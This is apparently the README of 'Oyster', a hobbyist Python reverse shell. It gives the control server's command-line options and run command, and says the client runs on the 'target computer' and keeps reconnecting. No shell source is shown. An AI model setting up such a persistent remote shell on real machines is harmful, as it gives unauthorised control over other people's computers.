```python
 .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'```

Oyster is a lightweight reverse shell written in python 3.5.

I wrote this after finding an example reverse shell on the thenewboston youtube channel.  I saw some things I wanted to
improve, so that's what I attempted to do.  The clients will continuously try to make a connection with the server, even
after the server closes the connection.

## Control Server

Start `server.py` from the command line.  Here are the keyword arguments used for `server.py`:

```
host
port
recv_size
listen
bind_retry
```

### Example

All of the arguments provided below are the defaults

```
python3 server.py host=0.0.0.0 port=6667 recv_size=1024 listen=10 bind_retry=5
```

## Client

Start `client.py` on the target computer.

### Example

```
python3 client.py
```
